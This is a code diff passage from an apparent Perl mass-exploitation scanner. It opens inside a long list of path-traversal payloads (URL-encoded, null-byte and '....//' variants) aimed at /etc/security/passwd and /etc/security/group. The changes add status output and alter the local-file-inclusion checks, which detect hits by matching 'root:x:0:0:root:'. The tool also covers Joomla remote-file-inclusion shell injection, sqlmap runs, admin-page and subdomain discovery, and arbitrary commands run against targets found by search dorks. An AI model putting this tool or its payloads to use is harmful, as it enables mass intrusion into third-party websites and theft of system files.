F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....//etc/security/passwd","....//....//etc/security/passwd","....//....//....//etc/security/passwd","....//....//....//....//etc/security/passwd","....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//....//etc/security/passwd","....//etc/security/passwd%00","....//....//etc/security/passwd%00","....//....//....//etc/security/passwd%00","....//....//....//....//etc/security/passwd%00","....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//....//etc/security/passwd%00","/etc/security/group","../etc/security/group","../../etc/security/group","../../../etc/security/group","../../../../etc/security/group","../../../../../etc/security/group","../../../../../../etc/security/group","../../../../../../../etc/security/group","../../../../../../../../etc/security/group","../../../../../../../../../etc/security/group","../../../../../../../../../../etc/security/group","/etc/security/group%00","../etc/security/group%00","../../etc/security/group%00","../../../etc/security/group%00","../../../../etc/security/group%00","../../../../../etc/security/group%00","../../../../../../etc/security/group%00","../../../../../../../etc/security/group%00","../../../../../../../../etc/security/group%00","../../../../../../../../../etc/security/group%00","../../../../../../../../../../etc/security/group%00","%2Fetc%2Fsecurity%2Fgroup","..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","%2Fetc%2Fsecurity%2Fgroup%00","..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","%2F%2Fetc/security/group","....%2F%2Fetc/security/group","....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","%2F%2Fetc/security/group%00","....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","//etc/security/group","....//etc/security/group","....//....//etc/security/group","....//....//....//etc/security/group","....//....//....//....//etc/security/group","....//....//....//....//....//etc/security/group","....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//....//....//....//etc/security/group","//etc/security/group%00","....//etc/security/group%00","....//....//etc/security/group%00","....//....//....//etc/security/group%00","....//....//....//....//etc/security/group%00","....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//....//....//....//etc/security/group%00");}
 
 sub XSS {@XSS = ("%27");}
 
@@ -782,25 +784,96 @@ sub progressbar {
     select(undef, undef, undef, 0.25);
     print "$poop";
   }
-  print" \n";
+  print" \n\n";
+}
+sub scandetail {
+  print color 'bold yellow';
+  if (defined $Target) {
+    print "    [+] TARGET:: ". $Target . "\n";
+  }
+  if (defined $mtarget) {
+    print "    [+] TARGET:: ". $mtarget . "\n";
+  }
+  if ((defined $listname) && (!defined $dork)) {
+    print "    [+] LIST:: ". $listname . "\n";
+  }
+  if (defined $exploit) {
+    print "    [+] EXPLOIT:: ". $exploit . "\n";
+  }
+  if (defined $mxss) {
+    print "    [+] SCAN:: Xss\n";
+  }elsif (defined $mlfi) { 
+    print "    [+] SCAN:: Lfi\n";
+  }
+  if (defined $validation_text) {
+    print "    [+] VALIDATION:: ". $validation_text . "\n";
+  }elsif (defined $misup) { 
+    print "    [+] VALIDATION:: Code 200\n";
+  }
+  if ((defined $sqlmap) || (defined $sqlmap)) {
+    print "    [+] EXPLOITATION:: Sqlmap\n";
+  }
+  if (defined $mjoomrfi) {
+    print "    [+] EXPLOITATION:: Rfi Joomla\n";
+  }
+  if (defined $mcommand) {
+    print "    [+] EXPLOITATION:: ". $mcommand . "\n";
+  }
+  if (defined $mwpadf) {
+    print "    [+] EXPLOITATION:: ADF Wordpress\n";
+  }
+  if (defined $madmin) {
+    print "    [+] EXPLOITATION:: Get Admin Page\n";
+  }
+  if (defined $msites) {
+    print "    [+] EXPLOITATION:: Get Server Sites\n";
+  }
+  if (defined $msubdomain) {
+    print "    [+] EXPLOITATION:: Get Subdomains\n";
+  }  
+  if (defined $mports) {
+    if (defined $mbasic) {
+      print "    [+] EXPLOITATION:: Ports Basic Scan\n";
+	}elsif (defined $mall) {
+      print "    [+] EXPLOITATION:: Ports Complete Scan\n";
+	}else{
+      print "    [+] EXPLOITATION:: Ports User Scan\n";
+	}
+  }
+  if (defined $mwpsites) {
+    print "    [+] EXPLOITATION:: Get Worpress Sites\n";
+  }
+  if (defined $mjoomsites) {
+    print "    [+] EXPLOITATION:: Get Joomla Sites\n";
+  }
+  if (defined $shell) {
+    print "    [+] EXPLOITATION:: ". $shell . "\n";
+  }
+  if (defined $muploadsites) {
+    print "    [+] EXPLOITATION:: Get Upload Files\n";
+  }
+  if (defined $mzipsites) {
+    print "    [+] EXPLOITATION:: Get Zip Files\n";
+  }
+  print color RESET;
 }
 
 sub listchekxss {
   $listcheck = "XSS_Site_Scan.txt";
   if (-e $listcheck){ unlink 'XSS_Site_Scan.txt'};
- }
+}
 sub listchekvalidation {
   $listcheck = "Validated_Scan.txt";
   if (-e $listcheck){ unlink 'Validated_Scan.txt'};
- }
+}
 sub listchekisup{
   $listcheck = "Validated_Scan.txt";
   if (-e $listcheck){ unlink 'Validated_Scan.txt'};
- }
+}
 sub listchekjoomrfi {
   $listcheck = "Joom_RFI_Scan.txt";
   if (-e $listcheck){ unlink 'Joom_RFI_Scan.txt'};
- }
+}
 sub listcheklfi {
    $listcheck = "LFI_Scan.txt";
   if (-e $listcheck){ unlink 'LFI_Scan.txt'};
@@ -1136,7 +1209,7 @@ sub countargets {
   my $file = $listname;
   open my $file, "<", $listname;
   $lc++ while <$file>;
-  print color 'yellow';
+  print color 'bold yellow';
   print "    [!] $lc Result(s) Found in the List!\n";
   print color RESET;
   close $file;
@@ -1236,10 +1309,12 @@ sub submsearch {
     
     my @strings=('fr', 'it', 'ie', 'us', 'br', 'ma', 'dz', 'se', 'nl', 'il', 'ca', 'pt', 'pl', 'eg', 'tn', 'ae', 'qa', 'af', 'iq', 'ch', 'mx', 've', 'es', 'ro', 'ru', 'jp', 'id', 'de', 'ua', 'sa', 'ok', 'fi', 'no', 'cz', 'lu', 'uy');
     my $myrand = $strings[int rand @strings];
-	print color 'bold';
-    print "    [+] Random Search::: Bing ". $myrand . "\n";
+	print color 'bold yellow';
+    print "    [+] Random Search:: BING ". $myrand . "\n";
+	scandetail();
+	print color 'bold yellow';
+	print "    [+] [DORK] $dork \n";
     print color RESET;
-	
     forwait();
 	
     open (FILE, "dorks.txt");
@@ -1528,6 +1603,7 @@ if($task eq "2"){
 		    mvalidation_text();
             ###################################################################		
             countargets();
+			scandetail();
             forwait();
             open (TEXT, $listname);
 	        while (my $Target = <TEXT>) { 
@@ -1565,6 +1641,7 @@ if($task eq "2"){
 		  mexploit();
           ###################################################################		
           countargets();
+		  scandetail();
           forwait();
           open (TEXT, $listname);
 	      while (my $Target = <TEXT>) { 
@@ -1602,6 +1679,7 @@ if($task eq "2"){
 	    mlistname();
         ####################
         countargets();
+		scandetail();
         forwait();
         open (TEXT, $listname);
 	    while (my $Target = <TEXT>) {
@@ -1693,11 +1771,11 @@ if($task eq "2"){
           ## bgn mtexplVaXss
           sub mtexplVaXss {
 	        listchekxss();
-
 	        Target();
 	        mexploit();
 		    mvalidation_text();
             ##############################
+			scandetail();
             forwait();
 	        my $URL = $Target.$exploit;
 			$URL =~ s/ //g;
@@ -1728,6 +1806,7 @@ if($task eq "2"){
 	        Target();
 	        mexploit();
             ###########################
+			scandetail();
             forwait();
 	        my $URL = $Target.$exploit;
 			$URL =~ s/ //g;
@@ -1777,6 +1856,7 @@ if($task eq "2"){
 		  XSS();
 	      Target();
           #########################################
+		  scandetail();
           forwait();
           foreach $XSS(@XSS){
             my $URL = $Target.$XSS;
@@ -1830,6 +1910,7 @@ if($task eq "2"){
           ###############################
 	      sub sqlmaptor {
           ###############################
+		  scandetail();
           open (INFO, 'XSS_Site_Scan.txt');
 	      while (my $Target = <INFO>) {
 	        chomp $Target;
@@ -1934,7 +2015,7 @@ if($task eq "2"){
 	    ##bgn sqlmap without tor 
 	    sub sqlmap {
         ######################################################################
-		
+		  scandetail();
           open (INFO, 'XSS_Site_Scan.txt');
 	      while (my $Target = <INFO>) {  ### GET LIST
 	        chomp $Target;
@@ -2114,6 +2195,7 @@ if($task eq "2"){
 ############################## 
 
       countargets();
+	  scandetail();
       forwait();
       
       open (TEXT, $listname);
@@ -2124,25 +2206,26 @@ if($task eq "2"){
         print "    [+] Checking $Target\n";
         foreach $LFI(@LFI){
           my $URL = $Target.$LFI;
-          my $Source = get $URL;
-          die "Can not get $URL" unless defined $URL;
-		  
-		  if (defined $validation_txt) {
-	        if ($Source =~ m/$validation_txt/i) {
-	          print color 'green';
-              print "    [!] $URL\n";
-	          print color RESET;
-			}
+          $request = HTTP::Request->new('GET', $URL);
+          $response = $ua->request($request);
+          my $Source = $response->content;
+		  if ((defined $validation_txt) && ($Source =~ m/$validation_txt/i)) {
+	        print color 'green';
+            print "    [!] $URL\n";
+	        print color RESET;
+		    open (INFO, '>>LFI_Scan.txt');
+            print INFO "$URL\n";
+		    close (INFO);
 		  }else{
 	        if ($Source =~ m/root:x:0:0:root:/i) {
 	          print color 'green';
               print "    [!] $URL\n";
 	          print color RESET;
+		      open (INFO, '>>LFI_Scan.txt');
+              print INFO "$URL\n";
+		      close (INFO);
 		    }
           } 
-		  open (INFO, '>>LFI_Scan.txt');
-          print INFO "$URL\n";
-		  close (INFO);
         } ### END FOREACH
 	  } ### END WHILE 
       finlfi();
@@ -2150,8 +2233,6 @@ if($task eq "2"){
      } ## mlistLfi 
 ############################## 
       mlistLfi();
-    
-      
     }else{ ####### IF NO USE LIST
     #######################
       print color 'yellow';
@@ -2162,7 +2243,6 @@ if($task eq "2"){
       chomp ($Target);
       if (!$Target){ 
         print color 'red';
-
 	    print "    [+] Uppss.. you have to set a Target!\n";
         print color RESET;
 	    goto id7;
@@ -2181,18 +2261,17 @@ if($task eq "2"){
 	     LFI();
 		 Target();
 ############################## 
-      
+      scandetail();
+	  forwait();
       foreach $LFI(@LFI){
         my $URL = $Target.$LFI;
-        my $Source = get $URL;
-        die "Can not get $URL" unless defined $URL;
-	
-		if (defined $validation_txt) {
-	      if ($Source =~ m/$validation_txt/i) {
-	        print color 'green';
-            print "    [!] $URL\n";
-	        print color RESET;
-		  }
+        $request = HTTP::Request->new('GET', $URL);
+        $response = $ua->request($request);
+        my $Source = $response->content;
+		if ((defined $validation_txt) && ($Source =~ m/$validation_txt/i)) {
+	      print color 'green';
+          print "    [!] $URL\n";
+	      print color RESET;
 	    }else{
 	      if ($Source =~ m/root:x:0:0:root:/i) {
 	        print color 'green';
@@ -2331,6 +2410,7 @@ if($task eq "2"){
 	   mlistname();
 #################################################################
         countargets();
+		scandetail();
         forwait();
       open (TEXT, $listname);
 	  while (my $Target = <TEXT>) { ###
@@ -2397,22 +2477,23 @@ if($task eq "2"){
 	   RFI();
 	   Target();
 #################################################################
-        forwait();
-      foreach $RFI(@RFI){
-        my $URL =$Target.$RFI.$shell;
-		$URL =~ s/ //g;
-        $request = HTTP::Request->new('GET', $URL);
-        $response = $ua->request($request);
-        my $Source = $response->content;
+       scandetail();
+       forwait();
+       foreach $RFI(@RFI){
+         my $URL =$Target.$RFI.$shell;
+		 $URL =~ s/ //g;
+         $request = HTTP::Request->new('GET', $URL);
+         $response = $ua->request($request);
+         my $Source = $response->content;
 
-        if ($Source =~ /r57shell/ || /safe_mode/ || /Executed / || /Shell/){
-	      print color 'green';
-          print "    [!] $URL\n";
-	      print color RESET;
+         if ($Source =~ /r57shell/ || /safe_mode/ || /Executed / || /Shell/){
+	       print color 'green';
+           print "    [!] $URL\n";
+	       print color RESET;
           
-          open (INFO, '>>Joom_RFI_Scan.txt');
-          print INFO "$URL\n";
-          close (INFO);
+           open (INFO, '>>Joom_RFI_Scan.txt');
+           print INFO "$URL\n";
+           close (INFO);
 	    }
       }
 	  
@@ -2423,7 +2504,6 @@ if($task eq "2"){
 	  mtjoomrfi();
 	  
     } #### END NO USE LIST
-    
 	
 #################################################################      
      sub finjoomrfi {
@@ -2523,6 +2603,7 @@ if($task eq "2"){
 	   mlistname();
 #################################################################
         countargets();
+		scandetail();
         forwait();
         
       open (TEXT, $listname);
@@ -2581,6 +2662,7 @@ if($task eq "2"){
 	   ADFWP();
 	   Target();
 #################################################################
+      scandetail();
       forwait();
       foreach $ADFWP(@ADFWP){
         my $URL = $Target.$ADFWP;
@@ -2705,6 +2787,7 @@ if($task eq "2"){
 	   mlistname();
 #################################################################
       countargets();
+	  scandetail();
       forwait();
 
       open (TEXT, $listname);
@@ -2772,6 +2855,7 @@ if($task eq "2"){
 	   ADMIN();
 	   Target();
 #################################################################
+      scandetail();
       forwait();
       
       foreach $ADMIN(@ADMIN){
@@ -2906,6 +2990,7 @@ if($task eq "2"){
 	   mlistname();
 #################################################################
       countargets();
+	  scandetail();
       forwait();
       open (TEXT, $listname);
 	  while (my $Target = <TEXT>) { 
@@ -2970,6 +3055,7 @@ if($task eq "2"){
 	   ADMIN();
 	   Target();
 #################################################################
+      scandetail();
       forwait();
 
 	  foreach $SUBDOMAIN(@SUBDOMAIN){	
@@ -3181,6 +3267,7 @@ if($task eq "3"){
     sub basic {
       server();
       $type=$_[0];
+	  scandetail();
       forwait();
       open (TEXT, "servers.txt");
 	  while (my $Target = <TEXT>) { ###
@@ -3215,6 +3302,7 @@ if($task eq "3"){
     ################################
     sub basic2 {
       server();
+	  scandetail();
       forwait();
       open (TEXT, "servers.txt");
 	  while (my $Target = <TEXT>) { ###
@@ -3259,7 +3347,7 @@ if($task eq "3"){
     sub complete {
       server();
       $type2=$_[0];
-	  
+	  scandetail();
       forwait();
       open (TEXT, "servers.txt");
 	  while (my $Target = <TEXT>) { ###
@@ -3293,6 +3381,7 @@ if($task eq "3"){
     #####################################
     sub complete2 {
       server();
+	  scandetail();
       forwait();
       open (TEXT, "servers.txt");
 	  while (my $Target = <TEXT>) { ###
@@ -3353,7 +3442,7 @@ if($task eq "3"){
     sub user {
       subuser();
       $type3=$_[0];
-	  
+	  scandetail();
       forwait();
       open (TEXT, "servers.txt");
 	  while (my $Target = <TEXT>) { ###
@@ -3386,6 +3475,7 @@ if($task eq "3"){
    ##################################
    sub user2 {
       subuser();
+	  scandetail();
       forwait();
 
       open (TEXT, "servers.txt");
@@ -3484,6 +3574,7 @@ sub submsites {
 ## bgn sub msites
    sub msites {
 ##############################################################
+    scandetail();
     forwait();
     $listcheck = "Server_sites_Scan.txt";
     if (-e $listcheck){ unlink 'Server_sites_Scan.txt'};
@@ -3622,7 +3713,6 @@ sub submsites {
     sub mwpsites {
     #####################################################
       submsites();
-
 
       $listcheck = "WP_server_sites_Scan.txt";
       if (-e $listcheck){ unlink 'WP_server_sites_Scan.txt'};
@@ -4283,25 +4373,28 @@ if($task eq "5"){
     goto TERMINAL;
   };
   
-############################
-sub mcommand {
-  submsearch();
-  $listname="Search_Scan.txt";
-  countargets();
-  forwait();
-  open (TEXT, $listname);
-  while (my $Target = <TEXT>) { 
-    chomp $Target;
-    if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
-    print color 'yellow'; 
-    print "\n    [+] $Target";
-    print "\n    ===========================================\n";
-    print color RESET;
-	my $command = $command.' '.$Target;
-	print "$command \n";
-    system($command);
+  ############################
+  sub mcommand {
+    if (defined $dork) {
+      submsearch();
+      $listname="Search_Scan.txt";
+      countargets();
+	  scandetail();
+      forwait();
+      open (TEXT, $listname);
+      while (my $Target = <TEXT>) { 
+        chomp $Target;
+        if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
+        print color 'yellow'; 
+        print "\n    [+] $Target";
+        print "\n    ===========================================\n";
+        print color RESET;
+	    my $command = $command.' '.$Target;
+	    print "$command \n";
+        system($command);
+      }
+    }
   }
-}
 
 ############################
 
@@ -4315,7 +4408,7 @@ sub mcommandfin {
 	}
   }
 }
- mcommandfin();
+  mcommandfin();
   
   print color 'red';
   timer();
@@ -4452,6 +4545,7 @@ if($task eq "7"){
     print "       -l:         | list \n";
     print "       --valid:    | text for validate results \n";
     print "       --exp:      | exploit";
+    print "       --command:  | Extern Command to execute";
     print "       --sqlmap:   | sqlmaping xss results \n";
     print "       --sqlmaptor:| sqlmaping xss results using tor proxy\n";
     print "       --lfi:      | local file inclusion \n";
